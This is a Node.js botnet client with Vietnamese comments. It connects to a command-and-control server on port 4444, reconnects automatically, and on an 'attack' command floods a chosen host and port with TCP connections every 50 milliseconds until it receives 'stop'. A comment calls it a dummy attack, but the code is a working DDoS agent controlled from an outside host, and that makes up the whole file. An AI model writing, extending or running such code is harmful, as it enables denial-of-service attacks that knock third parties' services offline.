const net = require('net');

const c2Host = 'c2'; // C2 server host (cần có đúng tên hoặc IP)
const c2Port = 4444; // Cổng mà C2 server nghe

function connectToC2() {
    const client = net.createConnection({ host: c2Host, port: c2Port }, () => {
        console.log('[+] Connected to C2');
    });

    client.on('error', (err) => {
        console.log('[!] Failed to connect to C2, retrying in 5s...');
        setTimeout(connectToC2, 5000); // Thử lại sau 5s nếu không kết nối được
    });

    client.on('data', (data) => {
        const lines = data.toString().trim().split('\n');
        for (const line of lines) {
            const [cmd, ...args] = line.trim().split(/\s+/);
            if (cmd === 'attack' && args.length === 2) {
                const target = args[0];
                const port = parseInt(args[1], 10);
                startAttack(target, port); // Bắt đầu tấn công
            } else if (cmd === 'stop') {
                stopAttack(); // Dừng tấn công
            } else {
                console.log('[?] Unknown command:', line);
            }
        }
    });

    client.on('end', () => {
        console.log('[-] Disconnected from C2');
    });
}

connectToC2();

let attackInterval = null;

// Function tấn công (dummy attack)
function startAttack(target, port) {
    console.log(`[!] Attacking ${target}, port ${port}`);
    attackInterval = setInterval(() => {
        const s = net.createConnection({ host: target, port: port }, () => {
            s.end(); // Mở và đóng kết nối TCP để tạo tấn công
        });
        s.on('error', () => { }); // Tránh crash
    }, 50);
}

function stopAttack() {
    if (attackInterval) {
        clearInterval(attackInterval);
        attackInterval = null;
        console.log('[!] Attack stopped');
    }
}
